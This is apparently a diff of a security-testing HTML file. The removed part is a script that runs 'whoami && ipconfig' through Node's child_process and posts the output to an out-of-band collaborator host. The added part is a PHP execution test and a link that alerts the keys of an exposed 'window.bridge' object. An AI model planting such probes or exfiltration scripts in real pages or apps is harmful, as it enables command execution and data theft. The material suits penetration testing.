@@ -1,20 +1,12 @@
 <!DOCTYPE html>
+<html>
+<head>
+  <title>PHP Test</title>
+</head>
 <body>
-  <script>
-    // Check if Node.js is available
-    if (typeof process !== 'undefined') {
-      const { exec } = require('child_process');
-      exec('whoami && ipconfig', (err, stdout) => {
-        fetch('https://YOUR-COLLAB.oastify.com/rce', { 
-          method: 'POST', 
-          body: err ? err.message : stdout 
-        });
-      });
-    } else {
-      alert('Node.js integration disabled!');
-    }
-  </script>
+  <h1>PHP Execution Test</h1>
+  <p>Today's date is: <?php echo date("Y-m-d H:i:s"); ?></p>
 </body>
 </html>
 
-
+<a href="#" onclick="alert(Object.keys(window.bridge))">Click</a>
